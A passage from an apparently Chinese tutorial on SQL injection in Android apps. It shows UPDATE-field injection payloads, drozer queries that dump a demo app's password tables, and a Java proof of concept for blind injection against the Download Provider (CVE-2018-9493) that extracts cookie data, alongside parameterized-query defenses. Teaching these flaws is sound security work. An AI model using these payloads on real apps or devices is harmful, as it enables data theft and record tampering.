PASSWORD <span class="operator">=</span>..,               PHONE<span class="operator">=</span><span class="string">&#x27;...&#x27;</span> <span class="keyword">WHERE</span> ID <span class="operator">=</span> (...)</span><br></pre></td></tr></table></figure><p>这里我们模拟一般的管理系统，很显然只能管理员对员工的一些信息进行修改，比如薪资，而员工只能修改一般的字段，我们这里通过普通用户模式登陆</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/16.png" alt="image-20220710163736745"></p><p>可以很明显发现，这里的薪资是无法进行修改的，那我们通过添加字段利用逻辑错误来实现修改</p><p>构造SQL:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> NICKNAME<span class="operator">=</span>..., EMAIL <span class="operator">=</span>..., ADDRESS<span class="operator">=</span>..., PASSWORD <span class="operator">=</span>..,               PHONE<span class="operator">=</span><span class="string">&#x27;21389&#x27;</span>, SALARY<span class="operator">=</span><span class="string">&#x27;100000000&#x27;</span> </span><br><span class="line"><span class="keyword">WHERE</span> ID <span class="operator">=</span> (Alice.id)</span><br></pre></td></tr></table></figure><p>我们这里修改Phone的字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21389</span><span class="string">&#x27;, SALARY=&#x27;</span><span class="number">100000000</span></span><br></pre></td></tr></table></figure><p>这样就多加了一个字段，但是我们对上面代码逻辑进行分析，发现只是对字符串进行读取，并未校验</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/17.png" alt="image-20220710164102899"></p><p>点击更新</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/18.png" alt="image-20220710164124887"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/19.png" alt="image-20220710164202529"></p><p>再次进入我们就发现薪资变为了我们预设的数字</p><p>当然利用上面的实现我们还能修改用户名，比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> employee <span class="keyword">SET</span> NICKNAME<span class="operator">=</span>..., EMAIL <span class="operator">=</span>..., ADDRESS<span class="operator">=</span>..., PASSWORD <span class="operator">=</span>..,               PHONE<span class="operator">=</span><span class="string">&#x27;21389&#x27;</span>, SALARY<span class="operator">=</span><span class="number">100000000</span></span><br><span class="line"><span class="keyword">WHERE</span> NAME <span class="operator">=</span> <span class="string">&#x27;Boby&#x27;</span> <span class="comment">-- &#x27; WHERE ID = (Alice.id)</span></span><br></pre></td></tr></table></figure><p>我们构造语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21389</span><span class="string">&#x27;, SALARY=10000000 WHERE NAME=&#x27;</span>Bobby<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/20.png" alt="image-20220710165113539"></p><p>更新成功后，我们进入Bobby的信息，发现就被修改了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/21.png" alt="image-20220710165227929"></p><h3 id="4-漏洞的挖掘思路"><a href="#4-漏洞的挖掘思路" class="headerlink" title="4.漏洞的挖掘思路"></a>4.漏洞的挖掘思路</h3><p>我们前面讲了三种常见类型的SQL注入的案例，但是我们在实际挖掘过程中，怎么初步的判断是否存在这类漏洞，并进行使用</p><p>我们打开另外一个样本APK</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/25.png" alt="image-20220710171128029"></p><p>我们知道并不是所有APK样本，我们都能很轻易的获得源码，有些可能使用了加壳服务，但是测试上述的漏洞很容易</p><p>我们都知道SQL注入需要单引号配对，我们可以根据日志和错误提示来查看</p><p>首先我们先进行日志监听或使用ddms</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat |grep packagename</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/26.png" alt="image-20220710171544841"></p><p>然后我们输入一个单引号<code>&#39;</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/27.png" alt="image-20220710171759976"></p><p>很明显说明这里是存在SQL注入，说明程序是有从Sqlite中获取信息，但由于我们输入<code>&#39;</code>引号，没有配对，导致程序错误</p><p>然后我们再输入双引号<code>&#39;&#39;</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/28.png" alt="image-20220710172000010"></p><p>程序正在搜索输入的数据，没有产生SQL错误。为了进一步确认，我们再加一个单引号，看看是否会引发SQL错误</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/29.png" alt="image-20220710172107288"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/30.png" alt="image-20220710172135897"></p><p>程序再次报错，说明奇数个<code>&#39;</code>会导致SQL错误，当引号刚好匹配时SQL查询正好会执行</p><p>然后我们就可以使用我们上面的漏洞来进行测试，我们使用一个万能语句，即无论正确错误都输入的语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27; !=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>无论是ture还是flase我们都满足，即万能语句</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/31.png" alt="image-20220710172419976"></p><p>这里我们就成功的爆出了相关信息</p><p>这里很显然是app接收了用户的输入，没有经过验证就直接加入到SQL查询语句</p><h3 id="5-安全防护"><a href="#5-安全防护" class="headerlink" title="5.安全防护"></a>5.安全防护</h3><p>针对1-3的漏洞现象，样本中依次进行了安全防护</p><p><strong>针对1-2的防护：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/22.png" alt="image-20220710165651424"></p><p>上图中2表示防护的代码</p><p><strong>针对3的防护：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/23.png" alt="image-20220710165822151"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/24.png" alt="image-20220710165913808"></p><p>我们可以发现上传的防护方式，都使用了<code>?</code>, 问号<code>?</code>是 SQL 查询中的参数持有者，将使用 String ListArray 中给出的相应参数进行编译，即会对输入的参数进行转义和绑定，这样就可以有效的进行参数输入防护</p><h2 id="四、Content-Provider上Sql注入漏洞"><a href="#四、Content-Provider上Sql注入漏洞" class="headerlink" title="四、Content Provider上Sql注入漏洞"></a>四、Content Provider上Sql注入漏洞</h2><p>我在<a href="https://bbs.pediy.com/thread-269447.htm">Android APP漏洞之战（4）——Content漏洞详解</a>已经初步介绍了Content Provider中存在的sql注入漏洞，我们知道Android中provider提供不同进程之间共享内容，而content在查询的过程中也会存在一些典型的Sql注入漏洞</p><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h3><p>Content Provider SQL注入漏洞产生的因如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Content Provider组件是可导出的未校验输入值是否符舍规范，就作为SQL语句的一部分，例如：</span><br><span class="line"><span class="type">String</span> <span class="variable">inputUserName</span> <span class="operator">=</span> <span class="string">&quot;123&#x27;or&#x27;1=1&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">inputPassword</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select *from user where username=&#x27;&quot;</span>+inputUserName +<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>+inputPassword+<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.rawQuery(sql);</span><br><span class="line">以上两点均满足的情况下，就会产生SQL注入风险</span><br></pre></td></tr></table></figure><h3 id="2-漏洞检测"><a href="#2-漏洞检测" class="headerlink" title="2.漏洞检测"></a>2.漏洞检测</h3><p>我们挖掘Content Provider漏洞的步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）扫描全局代码，是否存在导出的Content Provider组件</span><br><span class="line">（2）若存在导出的Content Provider组件，则判断SQL语句中是否有未校验的输入值，若存在则存在风险。</span><br><span class="line">（3）汇总结果</span><br></pre></td></tr></table></figure><h3 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3.漏洞复现"></a>3.漏洞复现</h3><p>我们使用drozer扫描注入的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a &lt;包名&gt;</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/32.png" alt="image-20220710165913808"></p><p>然后我们执行以下命令，发现返回了报错信息，接着构造sql获取敏感数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span></span><br><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot; * from Key;--+&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/33.png" alt="image-20220710165913808"></p><p>列出所有表信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content:<span class="comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM SQLITE_MASTER WHERE type=&#x27;table&#x27;;--&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/34.png" alt="image-20220710165913808"></p><p>获取具体表信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* FROM Key;--&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/35.png" alt="image-20220710165913808"></p><p>列出该app的表信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.sqltables -a  com.mwr.example.sieve</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/36.png" alt="image-20220710165913808"></p><h3 id="4-安全防护"><a href="#4-安全防护" class="headerlink" title="4.安全防护"></a>4.安全防护</h3><p>（1）不需要导出的Content Provider组件，建议显示设置组件的“android:exported”属性为false</p><p>（2）当组件可导出时，建议使用selectionArgs进行参数化组成SQL语句，例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">inputUserName</span> <span class="operator">=</span> <span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">inputPassword</span> <span class="operator">=</span> <span class="string">&quot;xxxx&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select *from user where username=? and password=?&quot;</span>;</span><br><span class="line"><span class="type">Cursor</span> <span class="variable">cursor</span> <span class="operator">=</span> db.rawQuery(sql,<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;username,password&#125;);</span><br></pre></td></tr></table></figure><p>我们可以发现Content Provider上的sql漏洞核心原理和上面是一样的</p><h2 id="五、Android-Download-Provider上sql注入漏洞"><a href="#五、Android-Download-Provider上sql注入漏洞" class="headerlink" title="五、Android Download Provider上sql注入漏洞"></a>五、Android Download Provider上sql注入漏洞</h2><p>Android Download Provider是用来进行下载的一个重要组件，Android提供了一套处理其他App下载请求的机制，例如浏览器的下载、邮件附件的下载、OTA升级包下载等。其中Download Manager用来处理下载请求，DownloadManager下载过程中，会将下载的数据和下载的状态插入ContentProvider中，完成下载后使用ContentProvider来提供下载内容给请求方APP。</p><p>下载的流程关系图：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/38.png" alt="image-20220710193502503"></p><h3 id="1-CVE-2018-9493-Download-Provider-SQL注入"><a href="#1-CVE-2018-9493-Download-Provider-SQL注入" class="headerlink" title="1.CVE-2018-9493: Download Provider SQL注入"></a>1.CVE-2018-9493: Download Provider SQL注入</h3><h4 id="（1）漏洞原理-3"><a href="#（1）漏洞原理-3" class="headerlink" title="（1）漏洞原理"></a>（1）漏洞原理</h4><p>通过利用SQL注入漏洞，未授予任何权限的恶意应用程序可以绕过当前实现的所有访问控制机制，从下载提供程序检索所有条目。 此外，被授予有限权限的应用程序（如Internet）也可以从不同的URI访问所有数据库内容。 对于Gmail、Chrome或Google Play Store等应用程序，从该提供程序检索的信息可能包括潜在的敏感信息，如文件名、描述、标题、路径、URL（在查询字符串中可能包含敏感参数）等。</p><p>然而内部数据库中的某些列（例如<code>CookieData</code>）被认为是私有的，不能通过 Download Content Provider 直接访问，除非调用者具有不受限制的权限（URI 受<code>signatureOrSystem</code>访问级别保护）</p><p>利用 where 表达式中的 SQL 注入，绕过<code>setStrict</code>过滤器，将允许我们从内部数据库中提取内容，包括任何受限制的列下载</p><p>访问下载内容提供程序需要不同的权限，例如Internet或access_all_downloads，这取决于所请求的URI</p><p>例如：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/37.png" alt="image-20220710193502503"></p><p>但是可以针对下面URL，则无需任何权限：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content:<span class="comment">//downloads/public_downloads/#</span></span><br></pre></td></tr></table></figure><p>我们可以在源码中查看对该URI的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sURIMatcher.addURI(<span class="string">&quot;downloads&quot;</span>,</span><br><span class="line">   Downloads.Impl.PUBLICLY_ACCESSIBLE_DOWNLOADS_URI_SEGMENT + <span class="string">&quot;/#&quot;</span>,</span><br><span class="line">   PUBLIC_DOWNLOAD_ID);</span><br></pre></td></tr></table></figure><p>可以看出该URI，可以用于公共下载，但没有什么可以阻止攻击者注入SQL Selection子句来访问数据库中的任何行、列或表，包括受保护的列。这样我们就可以进行SQL注入</p><p>总结：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不需要权限：</span><br><span class="line">content:<span class="comment">//downloads/public_downloads/#</span></span><br><span class="line">需要权限android.permission.INTERNET：</span><br><span class="line">content:<span class="comment">//downloads/my_downloads/</span></span><br><span class="line">content:<span class="comment">//downloads/my_downloads/#</span></span><br><span class="line">content:<span class="comment">//downloads/download/</span></span><br><span class="line">content:<span class="comment">//downloads/download/#</span></span><br></pre></td></tr></table></figure><p>因此我们可以构造相关的sql注入语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query <span class="comment">--uri content://downloads/public_downloads/0 -- where &quot;1=1) OR (1=1&quot;</span></span><br></pre></td></tr></table></figure><p>这里需要从Google Chrome下载任何文件（即PDF文件）或从Gmail下载任何附件，确保提供程序包含一些数据，然后使用该语句</p><p>由于底层SQLiteQueryBuilder中强制使用严格模式，无法实现基于UNION语句的直接注入，但可以通过利用盲SQL注入提取所有信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query <span class="comment">--uri content://downloads/public_downloads/0 -- where &quot;1=1) AND (_id=1 AND cookiedata LIKE &#x27;a%&#x27;) OR (1=1&quot;</span></span><br></pre></td></tr></table></figure><p>也可以从request_headers表转储所有内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell content query <span class="comment">--uri content://downloads/public_downloads/0 -- where &quot;1=1) AND (SELECT header FROM request_headers WHERE _id=1) LIKE &#x27;a%&#x27; OR (1=1&quot;</span></span><br></pre></td></tr></table></figure><p>还可以使用盲SQL注入（如果启用此选项，则过程将稍微慢一些）来包含受限列，如UID、ETAG或CookieData</p><h4 id="（2）漏洞复现-3"><a href="#（2）漏洞复现-3" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>首先我们需要从google上下载一些数据</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/39.png" alt="image-20220710194802806"></p><p>这里没有合适的案例，就不进行演示了</p><p>然后我们编写Poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dump</span><span class="params">(<span class="type">boolean</span> dumpProtectedColumns)</span> &#123;</span><br><span class="line">       <span class="type">ContentResolver</span> <span class="variable">res</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line">       <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://downloads/public_downloads/#&quot;</span>);</span><br><span class="line">       <span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;ERROR: The device does not appear to be vulnerable1&quot;</span>);</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">//这里可以替换我们的sql注入构造语句</span></span><br><span class="line">           cur = res.query(uri, <span class="literal">null</span>, <span class="string">&quot;1=1) OR (1=1&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">           Log.e(<span class="string">&quot;WindXaa&quot;</span>, <span class="string">&quot;Error&quot;</span>, e);</span><br><span class="line">           Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;ERROR: The device does not appear to be vulnerable&quot;</span>);</span><br><span class="line">           <span class="comment">//return;</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span> || cur.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">               <span class="comment">// Iterate all results and display some fields for each row from the downloads database</span></span><br><span class="line">               <span class="keyword">while</span> (cur.moveToNext()) &#123;</span><br><span class="line">                   <span class="type">int</span> <span class="variable">rowId</span> <span class="operator">=</span> cur.getInt(cur.getColumnIndex(<span class="string">&quot;_id&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowData</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;_data&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowUri</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;uri&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowTitle</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;title&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">rowDescription</span> <span class="operator">=</span> cur.getString(cur.getColumnIndex(<span class="string">&quot;description&quot;</span>));</span><br><span class="line">                   <span class="type">String</span> <span class="variable">string</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                   <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(string);</span><br><span class="line">                   sb.append(<span class="string">&quot;DOWNLOAD ID &quot;</span>).append(rowId);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nData: &quot;</span>).append(rowData);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nUri: &quot;</span>).append(rowUri);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nTitle: &quot;</span>).append(rowTitle);</span><br><span class="line">                   sb.append(<span class="string">&quot;\nDescription: &quot;</span>).append(rowDescription);</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">if</span> (dumpProtectedColumns) &#123;</span><br><span class="line">                       <span class="type">int</span> <span class="variable">uid</span> <span class="operator">=</span> binarySearch(rowId, <span class="string">&quot;uid&quot;</span>);</span><br><span class="line">                       sb.append(<span class="string">&quot;\nUID: &quot;</span>).append(uid);</span><br><span class="line"></span><br><span class="line">                       dumpColumn(rowId, <span class="string">&quot;CookieData&quot;</span>, sb);</span><br><span class="line">                       dumpColumn(rowId, <span class="string">&quot;ETag&quot;</span>, sb);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">                   Log.w(<span class="string">&quot;WindXaa&quot;</span>,sb.toString());</span><br><span class="line">               &#125;</span><br><span class="line">               Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;\n\nDUMP FINISHED&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">               cur.close();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dumpColumn</span><span class="params">(<span class="type">int</span> rowId, String columnName, StringBuilder sb)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (isTrueCondition(rowId, <span class="string">&quot;length(&quot;</span> + columnName + <span class="string">&quot;) &gt; 0&quot;</span>)) &#123;</span><br><span class="line">           <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> binarySearch(rowId, <span class="string">&quot;length(&quot;</span> + columnName + <span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">           sb.append(<span class="string">&quot;\n&quot;</span> + columnName + <span class="string">&quot;: &quot;</span>);</span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">               <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> binarySearch(rowId, <span class="string">&quot;unicode(substr(&quot;</span> + columnName + <span class="string">&quot;,&quot;</span> + i + <span class="string">&quot;,1))&quot;</span>);</span><br><span class="line">               <span class="type">String</span> <span class="variable">newChar</span> <span class="operator">=</span> Character.toString((<span class="type">char</span>) c);</span><br><span class="line">               sb.append(newChar);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span> id, String sqlExpression)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">20000</span>;</span><br><span class="line">       <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">while</span> (min + <span class="number">1</span> &lt; max) &#123;</span><br><span class="line">           mid = (<span class="type">int</span>) Math.floor((<span class="type">double</span>) (max + min) / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (isTrueCondition(id, sqlExpression + <span class="string">&quot;&gt;&quot;</span> + mid))</span><br><span class="line">               min = mid;</span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">               max = mid;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ((mid == max) &amp;&amp; isTrueCondition(id, sqlExpression + <span class="string">&quot;=&quot;</span> + mid))</span><br><span class="line">           <span class="keyword">return</span> mid;</span><br><span class="line">       <span class="keyword">else</span> <span class="keyword">if</span> (isTrueCondition(id, sqlExpression + <span class="string">&quot;=&quot;</span> + (mid + <span class="number">1</span>))) <span class="comment">// Extra check</span></span><br><span class="line">           <span class="keyword">return</span> mid + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isTrueCondition</span><span class="params">(<span class="type">int</span> rowId, String sqlCondition)</span> &#123;</span><br><span class="line">       <span class="type">ContentResolver</span> <span class="variable">res</span> <span class="operator">=</span> getContentResolver();</span><br><span class="line">       <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(<span class="string">&quot;content://downloads/public_downloads/0&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">Cursor</span> <span class="variable">cur</span> <span class="operator">=</span> res.query(uri, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;_id&quot;</span>&#125;, <span class="string">&quot;_id=&quot;</span> + rowId + <span class="string">&quot;) and (&quot;</span> +</span><br><span class="line">               sqlCondition + <span class="string">&quot;) or (1=1&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> (cur != <span class="literal">null</span> &amp;&amp; cur.getCount() &gt; <span class="number">0</span>);</span><br><span class="line">       &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (cur != <span class="literal">null</span>)</span><br><span class="line">               cur.close();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>预期效果显示（这里由于没找到合适案例，使用官方图片展示效果）：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0018/40.png" alt="image-20220710195237128"></p><h4 id="（3）安全防护"><a href="#（3）安全防护" class="headerlink" title="（3）安全防护"></a>（3）安全防护</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">如果它没有破坏任何功能，请考虑添加被删除的行：</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">query</span><span class="params">(<span class="keyword">final</span> Uri uri, String[] projection,</span></span><br><span class="line"><span class="params">    <span class="keyword">final</span> String selection, <span class="keyword">final</span> String[] selectionArgs,</span></span><br><span class="line"><span class="params">    <span class="keyword">final</span> String sort)</span> 